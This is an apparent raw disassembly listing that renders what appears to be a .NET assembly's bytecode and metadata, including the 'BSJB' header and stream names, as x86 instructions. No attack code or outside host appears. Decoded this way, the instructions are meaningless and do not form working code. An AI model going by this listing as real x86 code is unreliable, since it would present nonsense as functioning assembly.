  405244:	add    BYTE PTR [eax],al
  405246:	add    al,0x2
  405248:	push   es
  405249:	inc    BYTE PTR [esi]
  40524b:	les    eax,FWORD PTR [eax]
  40524d:	add    BYTE PTR [esi],al
  40524f:	jae    0x405299
  405251:	add    DWORD PTR [eax],eax
  405253:	or     ch,BYTE PTR [eax]
  405255:	sahf   
  405256:	add    BYTE PTR [eax],al
  405258:	push   es
  405259:	push   es
  40525a:	jnp    0x4052bb
  40525c:	add    BYTE PTR [eax],al
  40525e:	add    al,0x2a
  405260:	push   ds
  405261:	add    ch,BYTE PTR [eax]
  405263:	pop    eax
  405264:	add    BYTE PTR [eax],al
  405266:	or     ch,BYTE PTR [edx]
  405268:	mov    es,WORD PTR [edx]
  40526a:	add    bh,BYTE PTR [ebx+0x63]
  40526d:	add    BYTE PTR [eax],al
  40526f:	add    al,0x7b
  405271:	inc    ebx
  405272:	add    BYTE PTR [eax],al
  405274:	add    al,0x2
  405276:	jnp    0x4052dc
  405278:	add    BYTE PTR [eax],al
  40527a:	add    al,0x2
  40527c:	jnp    0x4052e3
  40527e:	add    BYTE PTR [eax],al
  405280:	add    al,0x6f
  405282:	push   eax
  405283:	add    DWORD PTR [eax],eax
  405285:	or     bh,BYTE PTR [ebp+0x62]
  405288:	add    BYTE PTR [eax],al
  40528a:	add    al,0x2a
  40528c:	adc    esi,DWORD PTR [eax]
  40528e:	add    eax,DWORD PTR [eax]
  405290:	cmp    eax,DWORD PTR [eax]
  405292:	add    BYTE PTR [eax],al
  405294:	aas    
  405295:	add    BYTE PTR [eax],al
  405297:	adc    DWORD PTR [ebx-0x3b],esi
  40529a:	add    BYTE PTR [eax],al
  40529c:	push   es
  40529d:	or     al,BYTE PTR [esi]
  40529f:	add    edi,DWORD PTR [ebp+0x64]
  4052a2:	add    BYTE PTR [eax],al
  4052a4:	add    al,0x6
  4052a6:	add    al,0x7d
  4052a8:	add    BYTE PTR gs:[eax],al
  4052ab:	add    al,0x6
  4052ad:	add    bh,BYTE PTR [ebp+0x63]
  4052b0:	add    BYTE PTR [eax],al
  4052b2:	add    al,0x6
  4052b4:	adc    al,0x7d
  4052b6:	bound  eax,QWORD PTR [eax]
  4052b8:	add    BYTE PTR [edx+eax*1],al
  4052bb:	push   es
  4052bc:	inc    BYTE PTR [esi]
  4052be:	mov    BYTE PTR [eax],0x0
  4052c1:	push   es
  4052c2:	jae    0x40530c
  4052c4:	add    DWORD PTR [eax],eax
  4052c6:	or     ch,BYTE PTR [eax]
  4052c8:	sahf   
  4052c9:	add    BYTE PTR [eax],al
  4052cb:	push   es
  4052cc:	push   es
  4052cd:	jnp    0x405331
  4052cf:	add    BYTE PTR [eax],al
  4052d1:	add    al,0x2a
  4052d3:	add    BYTE PTR [ebx],cl
  4052d5:	xor    BYTE PTR [edx],al
  4052d7:	add    BYTE PTR [ebx],bl
  4052d9:	add    BYTE PTR [eax],al
  4052db:	add    BYTE PTR [eax],al
  4052dd:	add    BYTE PTR [eax],al
  4052df:	add    BYTE PTR [edx],al
  4052e1:	jnp    0x405326
  4052e3:	add    BYTE PTR [eax],al
  4052e5:	add    al,0x2c
  4052e7:	adc    al,BYTE PTR [ebx]
  4052e9:	outs   dx,DWORD PTR ds:[esi]
  4052ea:	push   ecx
  4052eb:	add    DWORD PTR [eax],eax
  4052ed:	or     bl,dh
  4052ef:	or     ah,BYTE PTR [esi]
  4052f1:	add    dl,BYTE PTR [edi*2+0x4000043]
  4052f8:	fiadd  WORD PTR [eax]
  4052fa:	sub    al,BYTE PTR [eax]
  4052fc:	add    DWORD PTR [eax],edx
  4052fe:	add    BYTE PTR [eax],al
  405300:	add    BYTE PTR [eax],al
  405302:	or     BYTE PTR [eax],al
  405304:	or     BYTE PTR [eax],dl
  405306:	add    BYTE PTR [edx],cl
  405308:	add    BYTE PTR ss:[eax],al
  40530b:	add    DWORD PTR [esi+0x2],edx
  40530e:	jnp    0x405353
  405310:	add    BYTE PTR [eax],al
  405312:	add    al,0x2c
  405314:	pop    es
  405315:	add    ebp,DWORD PTR [edi+0x51]
  405318:	add    DWORD PTR [eax],eax
  40531a:	or     ch,BYTE PTR [edx]
  40531c:	jae    0x40533f
  40531e:	add    DWORD PTR [eax],eax
  405320:	or     bh,BYTE PTR [edx+0xa]
  405323:	adc    al,0x2a
  405325:	push   ds
  405326:	add    ch,BYTE PTR [eax]
  405328:	mov    ecx,0x2a0a0000
  40532d:	add    BYTE PTR [eax],al
  40532f:	add    BYTE PTR [ebx],dl
  405331:	xor    BYTE PTR [ecx],al
  405333:	add    BYTE PTR [esi],cl
  405335:	add    BYTE PTR [eax],al
  405337:	add    BYTE PTR [eax+0x0],al
  40533a:	add    BYTE PTR [ecx],dl
  40533c:	add    esi,DWORD PTR [ebx-0x5c]
  40533f:	add    BYTE PTR [eax],al
  405341:	push   es
  405342:	or     al,BYTE PTR [esi]
  405344:	sub    BYTE PTR [edx+0x1],dl
  405347:	add    BYTE PTR [edx],cl
  405349:	sub    bl,BYTE PTR [esi]
  40534b:	add    ch,BYTE PTR [eax]
  40534d:	xchg   esi,eax
  40534e:	add    BYTE PTR [eax],al
  405350:	or     ch,BYTE PTR [edx]
  405352:	cmp    al,BYTE PTR [edx]
  405354:	sub    BYTE PTR [ebx+0x1],dl
  405357:	add    BYTE PTR [edx],cl
  405359:	add    al,BYTE PTR [ebx]
  40535b:	jge    0x4053a1
  40535d:	add    BYTE PTR [eax],al
  40535f:	add    al,0x2a
  405361:	push   ds
  405362:	add    ch,BYTE PTR [eax]
  405364:	push   esp
  405365:	add    DWORD PTR [eax],eax
  405367:	or     ch,BYTE PTR [edx]
  405369:	add    BYTE PTR [eax],al
  40536b:	add    BYTE PTR [ebx],cl
  40536d:	xor    BYTE PTR [ebx],al
  40536f:	add    BYTE PTR [ebx+0x0],al
  405372:	add    BYTE PTR [eax],al
  405374:	add    BYTE PTR [eax],al
  405376:	add    BYTE PTR [eax],al
  405378:	add    ch,BYTE PTR [eax]
  40537a:	push   ebp
  40537b:	add    DWORD PTR [eax],eax
  40537d:	or     ch,BYTE PTR [eax]
  40537f:	push   esi
  405380:	add    DWORD PTR [eax],eax
  405382:	or     al,BYTE PTR [edx]
  405384:	inc    BYTE PTR [esi]
  405386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405387:	add    BYTE PTR [eax],al
  405389:	push   es
  40538a:	jae    0x4053e3
  40538c:	add    DWORD PTR [eax],eax
  40538e:	or     ch,BYTE PTR [edi+0x58]
  405391:	add    DWORD PTR [eax],eax
  405393:	or     al,BYTE PTR [edx]
  405395:	sub    BYTE PTR [ecx+0x1],bl
  405398:	add    BYTE PTR [edx],cl
  40539a:	jb     0x4053aa
  40539c:	add    eax,0x94287000
  4053a1:	add    BYTE PTR [eax],al
  4053a3:	or     bh,BYTE PTR [ebp+0x45]
  4053a6:	add    BYTE PTR [eax],al
  4053a8:	add    al,0x2
  4053aa:	jnp    0x4053f1
  4053ac:	add    BYTE PTR [eax],al
  4053ae:	add    al,0x28
  4053b0:	pop    edx
  4053b1:	add    DWORD PTR [eax],eax
  4053b3:	or     ah,BYTE PTR [esi]
  4053b5:	fiadd  WORD PTR [ebx]
  4053b7:	fiadd  WORD PTR es:[eax]
  4053ba:	sub    al,BYTE PTR [eax]
  4053bc:	add    DWORD PTR [eax],edx
  4053be:	add    BYTE PTR [eax],al
  4053c0:	add    BYTE PTR [eax],al
  4053c2:	xor    DWORD PTR [eax],eax
  4053c4:	push   cs
  4053c5:	aas    
  4053c6:	add    BYTE PTR [ebx],al
  4053c8:	add    BYTE PTR ss:[eax],al
  4053cb:	add    DWORD PTR [ebx],ebx
  4053cd:	xor    BYTE PTR [ebx],al
  4053cf:	add    BYTE PTR [ebx+0x0],ch
  4053d2:	add    BYTE PTR [eax],al
  4053d4:	inc    ecx
  4053d5:	add    BYTE PTR [eax],al
  4053d7:	adc    DWORD PTR [edx+ecx*1],edx
  4053da:	add    bh,BYTE PTR [ebx+0x44]
  4053dd:	add    BYTE PTR [eax],al
  4053df:	add    al,0x4
  4053e1:	outs   dx,DWORD PTR ds:[esi]
  4053e2:	pop    ebx
  4053e3:	add    DWORD PTR [eax],eax
  4053e5:	or     ch,BYTE PTR [edi-0x67]
  4053e8:	add    BYTE PTR [eax],al
  4053ea:	push   es
  4053eb:	or     eax,DWORD PTR [edi]
  4053ed:	sub    BYTE PTR [eax+0x2d0a0000],bl
  4053f3:	dec    ebp
  4053f4:	add    bh,BYTE PTR [ebx+0x45]
  4053f7:	add    BYTE PTR [eax],al
  4053f9:	add    al,0x7
  4053fb:	sub    BYTE PTR [eax+eax*1-0x6bd7f600],ah
  405402:	add    BYTE PTR [eax],al
  405404:	or     cl,BYTE PTR [edi+eax*1]
  405407:	sub    BYTE PTR [ecx+0xd060000],ch
  40540d:	or     BYTE PTR [eax],ch
  40540f:	test   eax,0x13060000
  405414:	add    al,0x9
  405416:	adc    DWORD PTR [eax+ebp*1],eax
  405419:	pop    esp
  40541a:	add    DWORD PTR [eax],eax
  40541c:	or     ch,BYTE PTR [ecx*1+0x28170807]
  405423:	pop    ebp
  405424:	add    DWORD PTR [eax],eax
  405426:	or     bl,dh
  405428:	add    esp,DWORD PTR [esi]
  40542a:	fiadd  WORD PTR [eax]
  40542c:	or     BYTE PTR [eax],ch
  40542e:	mov    bh,0x0
  405430:	add    BYTE PTR [edx],cl
  405432:	adc    eax,DWORD PTR ds:0xa5280511
  405438:	add    BYTE PTR [eax],al
  40543a:	or     cl,BYTE PTR [edx]
  40543c:	fiadd  WORD PTR [ebx]
  40543e:	fiadd  WORD PTR es:[eax]
  405441:	push   es
  405442:	sub    al,BYTE PTR [eax]
  405444:	add    DWORD PTR [eax+eax*1],ebx
  405447:	add    BYTE PTR [eax],al
  405449:	add    BYTE PTR [edi+0x0],al
  40544c:	or     dl,BYTE PTR [ecx+0x0]
  40544f:	add    esi,DWORD PTR [esi]
  405451:	add    BYTE PTR [eax],al
  405453:	add    DWORD PTR [eax],eax
  405455:	add    BYTE PTR [eax+eax*1+0x12],dl
  405459:	data16 add BYTE PTR [ebx],al
  40545c:	add    BYTE PTR ss:[eax],al
  40545f:	add    DWORD PTR [ebx],edx
  405461:	xor    BYTE PTR ds:0x5300,al
  405467:	add    BYTE PTR [edx+0x0],al
  40546a:	add    BYTE PTR [ecx],dl
  40546c:	add    ebp,DWORD PTR ds:0x22a1602
  405472:	jnp    0x4054ba
  405474:	add    BYTE PTR [eax],al
  405476:	add    al,0x14
  405478:	sub    BYTE PTR [esi+0x1],bl
  40547b:	add    BYTE PTR [edx],cl
  40547d:	sub    al,0x33
  40547f:	rcl    BYTE PTR [eax+eax*1],1
  405482:	add    BYTE PTR [ecx],al
  405484:	sub    BYTE PTR [esi+0x0],al
  405487:	add    BYTE PTR [edx],cl
  405489:	sub    BYTE PTR [edi+0x1],bl
  40548c:	add    BYTE PTR [edx],cl
  40548e:	or     al,BYTE PTR [edx]
  405490:	push   es
  405491:	jb     0x4054c7
  405493:	add    eax,0x16167000
  405498:	outs   dx,DWORD PTR ds:[esi]
  405499:	pusha  
  40549a:	add    DWORD PTR [eax],eax
  40549c:	or     bh,BYTE PTR [ebp+0x46]
  40549f:	add    BYTE PTR [eax],al
  4054a1:	add    al,0x2
  4054a3:	jnp    0x4054eb
  4054a5:	add    BYTE PTR [eax],al
  4054a7:	add    al,0x14
  4054a9:	sub    BYTE PTR [esi+0x1],bl
  4054ac:	add    BYTE PTR [edx],cl
  4054ae:	sub    al,0x2
  4054b0:	push   ss
  4054b1:	sub    al,BYTE PTR [edx]
  4054b3:	jnp    0x4054fb
  4054b5:	add    BYTE PTR [eax],al
  4054b7:	add    al,0x3
  4054b9:	outs   dx,DWORD PTR ds:[esi]
  4054ba:	popa   
  4054bb:	add    DWORD PTR [eax],eax
  4054bd:	or     ch,BYTE PTR [edx]
  4054bf:	add    BYTE PTR [ebx],bl
  4054c1:	xor    BYTE PTR [ecx],al
  4054c3:	add    BYTE PTR [eax+eax*1],bl
  4054c6:	add    BYTE PTR [eax],al
  4054c8:	inc    ebx
  4054c9:	add    BYTE PTR [eax],al
  4054cb:	adc    DWORD PTR [esi+0x62],edi
  4054ce:	add    DWORD PTR [eax],eax
  4054d0:	or     cl,BYTE PTR [edx]
  4054d2:	add    ch,BYTE PTR [eax]
  4054d4:	cwde   
  4054d5:	add    BYTE PTR [eax],al
  4054d7:	or     ch,BYTE PTR ds:0x63280207
  4054dd:	add    DWORD PTR [eax],eax
  4054df:	or     cl,BYTE PTR [edx]
  4054e1:	fiadd  WORD PTR [ebx]
  4054e3:	fiadd  WORD PTR es:[eax]
  4054e6:	push   es
  4054e7:	sub    al,BYTE PTR [ecx]
  4054e9:	adc    BYTE PTR [eax],al
  4054eb:	add    BYTE PTR [eax],al
  4054ed:	add    BYTE PTR [esi],al
  4054ef:	add    BYTE PTR [ecx],dl
  4054f1:	pop    ss
  4054f2:	add    BYTE PTR [ebx],al
  4054f4:	add    DWORD PTR [eax],eax
  4054f6:	add    BYTE PTR [ecx],al
  4054f8:	adc    esi,DWORD PTR [eax]
  4054fa:	add    al,BYTE PTR [eax]
  4054fc:	sbb    al,0x0
  4054fe:	add    BYTE PTR [eax],al
  405500:	inc    esp
  405501:	add    BYTE PTR [eax],al
  405503:	adc    DWORD PTR [edx],eax
  405505:	jnp    0x40554b
  405507:	add    BYTE PTR [eax],al
  405509:	add    al,0x3
  40550b:	outs   dx,DWORD PTR ds:[esi]
  40550c:	call   0x2c06:0xa060000
  405513:	or     al,BYTE PTR [esi]
  405515:	outs   dx,DWORD PTR ds:[esi]
  405516:	add    DWORD PTR fs:[eax],eax
  405519:	or     dl,BYTE PTR [esi]
  40551b:	inc    BYTE PTR [ecx]
  40551d:	sub    dl,BYTE PTR [esi]
  40551f:	sub    dl,BYTE PTR [ebx]
  405521:	xor    BYTE PTR [edx],al
  405523:	add    BYTE PTR [ecx],bl
  405525:	add    BYTE PTR [eax],al
  405527:	add    BYTE PTR [eax+eax*1+0x0],al
  40552b:	adc    DWORD PTR [edx],eax
  40552d:	jnp    0x405573
  40552f:	add    BYTE PTR [eax],al
  405531:	add    al,0x3
  405533:	outs   dx,DWORD PTR ds:[esi]
  405534:	call   0x2c06:0xa060000
  40553b:	pop    es
  40553c:	push   es
  40553d:	outs   dx,DWORD PTR ds:[esi]
  40553e:	add    DWORD PTR fs:[eax],eax
  405541:	or     ch,BYTE PTR [edx]
  405543:	push   ss
  405544:	sub    al,BYTE PTR [eax]
  405546:	add    BYTE PTR [eax],al
  405548:	sbb    esi,DWORD PTR [eax]
  40554a:	add    al,BYTE PTR [eax]
  40554c:	aas    
  40554d:	add    BYTE PTR [eax],al
  40554f:	add    BYTE PTR [ebp+0x0],al
  405552:	add    BYTE PTR [ecx],dl
  405554:	adc    al,0xa
  405556:	add    al,BYTE PTR [ebx]
  405558:	sub    BYTE PTR [ebp+0x1],ah
  40555b:	add    BYTE PTR [edx],cl
  40555d:	or     bl,dh
  40555f:	add    esp,DWORD PTR [esi]
  405561:	fiadd  WORD PTR [eax]
  405563:	add    al,BYTE PTR [esi]
  405565:	sub    BYTE PTR [eax+0x2d060000],ch
  40556b:	and    eax,0x447b02
  405570:	add    BYTE PTR [ebx+eax*1],al
  405573:	outs   dx,DWORD PTR ds:[esi]
  405574:	call   0x2c07:0xb060000
  40557b:	adc    eax,0x1646f07
  405580:	add    BYTE PTR [edx],cl
  405582:	sub    eax,0x7b02070d
  405587:	inc    esp
  405588:	add    BYTE PTR [eax],al
  40558a:	add    al,0x73
  40558c:	scas   eax,DWORD PTR es:[edi]
  40558d:	add    BYTE PTR [eax],al
  40558f:	push   es
  405590:	or     al,BYTE PTR [esi]
  405592:	sub    al,BYTE PTR [eax]
  405594:	add    DWORD PTR [eax],edx
  405596:	add    BYTE PTR [eax],al
  405598:	add    BYTE PTR [eax],al
  40559a:	add    al,BYTE PTR [eax]
  40559c:	or     cl,BYTE PTR [eax+eax*1]
  40559f:	add    eax,DWORD PTR [ecx]
  4055a1:	add    BYTE PTR [eax],al
  4055a3:	add    DWORD PTR [ebx],edx
  4055a5:	xor    BYTE PTR [edx],al
  4055a7:	add    BYTE PTR ds:0x44000000,ch
  4055ad:	add    BYTE PTR [eax],al
  4055af:	adc    DWORD PTR [edx],eax
  4055b1:	jnp    0x4055f7
  4055b3:	add    BYTE PTR [eax],al
  4055b5:	add    al,0x3
  4055b7:	outs   dx,DWORD PTR ds:[esi]
  4055b8:	call   0x2c06:0xa060000
  4055bf:	adc    eax,0x1646f06
  4055c4:	add    BYTE PTR [edx],cl
  4055c6:	sub    al,0xd
  4055c8:	push   es
  4055c9:	add    bh,BYTE PTR [ebx+0x44]
  4055cc:	add    BYTE PTR [eax],al
  4055ce:	add    al,0x73
  4055d0:	mov    dl,0x0
  4055d2:	add    BYTE PTR [esi],al
  4055d4:	sub    al,BYTE PTR [edx]
  4055d6:	add    ebp,DWORD PTR [eax]
  4055d8:	add    WORD PTR [eax],ax
  4055db:	or     ch,BYTE PTR [edx]
  4055dd:	add    BYTE PTR [eax],al
  4055df:	add    BYTE PTR [ebx],dl
  4055e1:	xor    BYTE PTR [ebx],al
  4055e3:	add    BYTE PTR [ebx],cl
  4055e5:	add    BYTE PTR [eax],al
  4055e7:	add    BYTE PTR [esi],cl
  4055e9:	add    BYTE PTR [eax],al
  4055eb:	adc    DWORD PTR [edx],eax
  4055ed:	add    eax,DWORD PTR [eax+ebp*1]
  4055f0:	add    DWORD PTR [bx+si],eax
  4055f3:	or     cl,BYTE PTR [edx]
  4055f5:	push   es
  4055f6:	sub    ch,BYTE PTR [esi+0x2]
  4055f9:	add    ebp,DWORD PTR [edi+0x68]
  4055fc:	add    DWORD PTR [eax],eax
  4055fe:	or     ch,BYTE PTR [eax]
  405600:	imul   eax,DWORD PTR [ecx],0x3020a00
  405606:	jge    0x40564f
  405608:	add    BYTE PTR [eax],al
  40560a:	add    al,0x2
  40560c:	add    al,0x7d
  40560e:	dec    eax
  40560f:	add    BYTE PTR [eax],al
  405611:	add    al,0x2a
  405613:	xor    al,BYTE PTR [edx]
  405615:	jnp    0x40565e
  405617:	add    BYTE PTR [eax],al
  405619:	add    al,0x6f
  40561b:	push   0x1
  40561d:	add    BYTE PTR [edx],cl
  40561f:	sub    dl,BYTE PTR [ebx]
  405621:	xor    BYTE PTR [edx],al
  405623:	add    BYTE PTR [esi],bl
  405625:	add    BYTE PTR [eax],al
  405627:	add    BYTE PTR [esi],cl
  405629:	add    BYTE PTR [eax],al
  40562b:	adc    DWORD PTR [edx],eax
  40562d:	jnp    0x405677
  40562f:	add    BYTE PTR [eax],al
  405631:	add    al,0x2
  405633:	jnp    0x40567c
  405635:	add    BYTE PTR [eax],al
  405637:	add    al,0x6f
  405639:	push   0x6f0a0001
  40563e:	fwait
  40563f:	add    BYTE PTR [eax],al
  405641:	push   es
  405642:	or     al,BYTE PTR [esi]
  405644:	sub    BYTE PTR [ebx+0x1],ch
  405647:	add    BYTE PTR [edx],cl
  405649:	sub    ch,BYTE PTR [esi+0x2]
  40564c:	add    ebp,DWORD PTR [edi+0x68]
  40564f:	add    DWORD PTR [eax],eax
  405651:	or     ch,BYTE PTR [eax]
  405653:	ins    BYTE PTR es:[edi],dx
  405654:	add    DWORD PTR [eax],eax
  405656:	or     al,BYTE PTR [edx]
  405658:	add    edi,DWORD PTR [ebp+0x49]
  40565b:	add    BYTE PTR [eax],al
  40565d:	add    al,0x2
  40565f:	add    al,0x7d
  405661:	dec    edx
  405662:	add    BYTE PTR [eax],al
  405664:	add    al,0x2a
  405666:	xor    al,BYTE PTR [edx]
  405668:	jnp    0x4056b3
  40566a:	add    BYTE PTR [eax],al
  40566c:	add    al,0x6f
  40566e:	push   0x1
  405670:	add    BYTE PTR [edx],cl
  405672:	sub    al,BYTE PTR [eax]
  405674:	sbb    esi,DWORD PTR [eax]
  405676:	add    eax,DWORD PTR [eax]
  405678:	pop    edi
  405679:	add    BYTE PTR [eax],al
  40567b:	add    BYTE PTR [esi+0x0],al
  40567e:	add    BYTE PTR [ecx],dl
  405680:	jae    0x4056ef
  405682:	add    DWORD PTR [eax],eax
  405684:	or     cl,BYTE PTR [edx]
  405686:	add    bh,BYTE PTR [ebx+0x4a]
  405689:	add    BYTE PTR [eax],al
  40568b:	add    al,0x2
  40568d:	jnp    0x4056d8
  40568f:	add    BYTE PTR [eax],al
  405691:	add    al,0x6f
  405693:	push   0x180a0001
  405698:	outs   dx,DWORD PTR ds:[esi]
  405699:	pushf  
  40569a:	add    BYTE PTR [eax],al
  40569c:	push   es
  40569d:	or     eax,DWORD PTR [edi]
  40569f:	sub    al,0x3c
  4056a1:	pop    es
  4056a2:	outs   dx,DWORD PTR ds:[esi]
  4056a3:	outs   dx,BYTE PTR ds:[esi]
  4056a4:	add    DWORD PTR [eax],eax
  4056a6:	or     cl,BYTE PTR ds:0x3121a2b
  4056ac:	sub    BYTE PTR [edi+0x1],ch
  4056af:	add    BYTE PTR [edx],cl
  4056b1:	or     al,0x6
  4056b3:	or     BYTE PTR [edx],al
  4056b5:	jnp    0x405701
  4056b7:	add    BYTE PTR [eax],al
  4056b9:	add    al,0x73
  4056bb:	mov    dl,0x0
  4056bd:	add    BYTE PTR [esi],al
  4056bf:	outs   dx,DWORD PTR ds:[esi]
  4056c0:	jo     0x4056c3
  4056c2:	add    BYTE PTR [edx],cl
  4056c4:	adc    al,BYTE PTR [ebx]
  4056c6:	sub    BYTE PTR [ecx+0x1],dh
  4056c9:	add    BYTE PTR [edx],cl
  4056cb:	sub    eax,0x120ededd
  4056d0:	add    edi,esi
  4056d2:	push   ss
  4056d3:	sbb    BYTE PTR [eax],al
  4056d5:	add    BYTE PTR [ebx],bl
  4056d7:	outs   dx,DWORD PTR ds:[esi]
  4056d8:	inc    ebx
  4056d9:	add    BYTE PTR [eax],al
  4056db:	or     bl,ah
  4056dd:	push   es
  4056de:	sub    al,BYTE PTR [eax]
  4056e0:	add    DWORD PTR [eax],edx
  4056e2:	add    BYTE PTR [eax],al
  4056e4:	add    al,BYTE PTR [eax]
  4056e6:	sub    BYTE PTR [eax],al
  4056e8:	daa    
  4056e9:	dec    edi
  4056ea:	add    BYTE PTR [esi],cl
  4056ec:	add    BYTE PTR [eax],al
  4056ee:	add    BYTE PTR [eax],al
  4056f0:	sbb    esi,DWORD PTR [eax]
  4056f2:	add    eax,DWORD PTR [eax]
  4056f4:	pop    edi
  4056f5:	add    BYTE PTR [eax],al
  4056f7:	add    BYTE PTR [edi+0x0],al
  4056fa:	add    BYTE PTR [ecx],dl
  4056fc:	jae    0x405770
  4056fe:	add    DWORD PTR [eax],eax
  405700:	or     cl,BYTE PTR [edx]
  405702:	add    bh,BYTE PTR [ebx+0x4a]
  405705:	add    BYTE PTR [eax],al
  405707:	add    al,0x2
  405709:	jnp    0x405754
  40570b:	add    BYTE PTR [eax],al
  40570d:	add    al,0x6f
  40570f:	push   0x180a0001
  405714:	outs   dx,DWORD PTR ds:[esi]
  405715:	pushf  
  405716:	add    BYTE PTR [eax],al
  405718:	push   es
  405719:	or     eax,DWORD PTR [edi]
  40571b:	sub    al,0x3c
  40571d:	pop    es
  40571e:	outs   dx,DWORD PTR ds:[esi]
  40571f:	outs   dx,BYTE PTR ds:[esi]
  405720:	add    DWORD PTR [eax],eax
  405722:	or     cl,BYTE PTR ds:0x3121a2b
  405728:	sub    BYTE PTR [edi+0x1],ch
  40572b:	add    BYTE PTR [edx],cl
  40572d:	or     al,0x6
  40572f:	or     BYTE PTR [edx],al
  405731:	jnp    0x40577d
  405733:	add    BYTE PTR [eax],al
  405735:	add    al,0x73
  405737:	scas   eax,DWORD PTR es:[edi]
  405738:	add    BYTE PTR [eax],al
  40573a:	push   es
  40573b:	outs   dx,DWORD PTR ds:[esi]
  40573c:	jae    0x40573f
  40573e:	add    BYTE PTR [edx],cl
  405740:	adc    al,BYTE PTR [ebx]
  405742:	sub    BYTE PTR [ecx+0x1],dh
  405745:	add    BYTE PTR [edx],cl
  405747:	sub    eax,0x120ededd
  40574c:	add    edi,esi
  40574e:	push   ss
  40574f:	sbb    BYTE PTR [eax],al
  405751:	add    BYTE PTR [ebx],bl
  405753:	outs   dx,DWORD PTR ds:[esi]
  405754:	inc    ebx
  405755:	add    BYTE PTR [eax],al
  405757:	or     bl,ah
  405759:	push   es
  40575a:	sub    al,BYTE PTR [eax]
  40575c:	add    DWORD PTR [eax],edx
  40575e:	add    BYTE PTR [eax],al
  405760:	add    al,BYTE PTR [eax]
  405762:	sub    BYTE PTR [eax],al
  405764:	daa    
  405765:	dec    edi
  405766:	add    BYTE PTR [esi],cl
  405768:	add    BYTE PTR [eax],al
  40576a:	add    BYTE PTR [eax],al
  40576c:	sbb    esi,DWORD PTR [eax]
  40576e:	add    eax,DWORD PTR [eax]
  405770:	mov    BYTE PTR [eax],al
  405772:	add    BYTE PTR [eax],al
  405774:	dec    eax
  405775:	add    BYTE PTR [eax],al
  405777:	adc    DWORD PTR [ebx+0x74],esi
  40577a:	add    DWORD PTR [eax],eax
  40577c:	or     cl,BYTE PTR [edx]
  40577e:	add    bh,BYTE PTR [ebx+0x4a]
  405781:	add    BYTE PTR [eax],al
  405783:	add    al,0x2
  405785:	jnp    0x4057d0
  405787:	add    BYTE PTR [eax],al
  405789:	add    al,0x6f
  40578b:	push   0x160a0001
  405790:	outs   dx,DWORD PTR ds:[esi]
  405791:	pushf  
  405792:	add    BYTE PTR [eax],al
  405794:	push   es
  405795:	or     eax,DWORD PTR [edi]
  405797:	sub    al,0x65
  405799:	pop    es
  40579a:	outs   dx,DWORD PTR ds:[esi]
  40579b:	outs   dx,BYTE PTR ds:[esi]
  40579c:	add    DWORD PTR [eax],eax
  40579e:	or     cl,BYTE PTR ds:0x312432b
  4057a4:	sub    BYTE PTR [edi+0x1],ch
  4057a7:	add    BYTE PTR [edx],cl
  4057a9:	or     al,0x8
  4057ab:	outs   dx,DWORD PTR ds:[esi]
  4057ac:	add    DWORD PTR fs:[eax],eax
  4057af:	or     ch,BYTE PTR [ecx+eiz*1]
  4057b2:	or     BYTE PTR [edx],al
  4057b4:	jnp    0x405800
  4057b6:	add    BYTE PTR [eax],al
  4057b8:	add    al,0x73
  4057ba:	mov    dl,0x0
  4057bc:	add    BYTE PTR [esi],al
  4057be:	es push es
  4057c0:	or     BYTE PTR [edx],al
  4057c2:	jnp    0x40580e
  4057c4:	add    BYTE PTR [eax],al
  4057c6:	add    al,0x73
  4057c8:	mov    dl,0x0
  4057ca:	add    BYTE PTR [esi],al
  4057cc:	outs   dx,DWORD PTR ds:[esi]
  4057cd:	jne    0x4057d0
  4057cf:	add    BYTE PTR [edx],cl
  4057d1:	sub    edx,DWORD PTR [edx]
  4057d3:	push   es
  4057d4:	or     BYTE PTR [edx],al
  4057d6:	jnp    0x405822
  4057d8:	add    BYTE PTR [eax],al
  4057da:	add    al,0x73
  4057dc:	scas   eax,DWORD PTR es:[edi]
  4057dd:	add    BYTE PTR [eax],al
  4057df:	push   es
  4057e0:	outs   dx,DWORD PTR ds:[esi]
  4057e1:	jne    0x4057e4
  4057e3:	add    BYTE PTR [edx],cl
  4057e5:	adc    al,BYTE PTR [ebx]
  4057e7:	sub    BYTE PTR [ecx+0x1],dh
  4057ea:	add    BYTE PTR [edx],cl
  4057ec:	sub    eax,0x120edeb4
  4057f1:	add    edi,esi
  4057f3:	push   ss
  4057f4:	sbb    BYTE PTR [eax],al
  4057f6:	add    BYTE PTR [ebx],bl
  4057f8:	outs   dx,DWORD PTR ds:[esi]
  4057f9:	inc    ebx
  4057fa:	add    BYTE PTR [eax],al
  4057fc:	or     bl,ah
  4057fe:	push   es
  4057ff:	sub    al,BYTE PTR [ecx]
  405801:	adc    BYTE PTR [eax],al
  405803:	add    BYTE PTR [edx],al
  405805:	add    BYTE PTR [eax],ch
  405807:	add    BYTE PTR [eax+0x78],dl
  40580a:	add    BYTE PTR [esi],cl
  40580c:	add    BYTE PTR [eax],al
  40580e:	add    BYTE PTR [eax],al
  405810:	inc    edx
  405811:	push   ebx
  405812:	dec    edx
  405813:	inc    edx
  405814:	add    DWORD PTR [eax],eax
  405816:	add    DWORD PTR [eax],eax
  405818:	add    BYTE PTR [eax],al
  40581a:	add    BYTE PTR [eax],al
  40581c:	or     al,0x0
  40581e:	add    BYTE PTR [eax],al
  405820:	jbe    0x405856
  405822:	xor    BYTE PTR cs:[esi],ch
  405825:	xor    esi,DWORD PTR [eax]
  405827:	xor    esi,DWORD PTR [ecx]
  405829:	cmp    DWORD PTR [eax],eax
  40582b:	add    BYTE PTR [eax],al
  40582d:	add    BYTE PTR ds:0x6c00,al
  405833:	add    BYTE PTR [edi+eiz*1],dl
  405836:	add    BYTE PTR [eax],al
  405838:	and    edi,DWORD PTR [esi+0x0]
  40583b:	add    BYTE PTR [eax+0x34000027],al
  405841:	aaa    
  405842:	add    BYTE PTR [eax],al
  405844:	and    edx,DWORD PTR [ebx+0x74]
  405847:	jb     0x4058b2
  405849:	outs   dx,BYTE PTR ds:[esi]
  40584a:	addr16 jae 0x40584d
  40584d:	add    BYTE PTR [eax],al
  40584f:	add    BYTE PTR [esi+ebx*2+0x5e00000],dh
  405856:	add    BYTE PTR [eax],al
  405858:	and    edx,DWORD PTR [ebp+0x53]
  40585b:	add    BYTE PTR [esp+eiz*2+0x100000],dl
  405862:	add    BYTE PTR [eax],al
  405864:	and    eax,DWORD PTR [edi+0x55]
  405867:	dec    ecx
  405868:	inc    esp
  405869:	add    BYTE PTR [eax],al
  40586b:	add    BYTE PTR [esp+eiz*2+0x14b40000],ah
  405872:	add    BYTE PTR [eax],al
  405874:	and    eax,DWORD PTR [edx+0x6c]
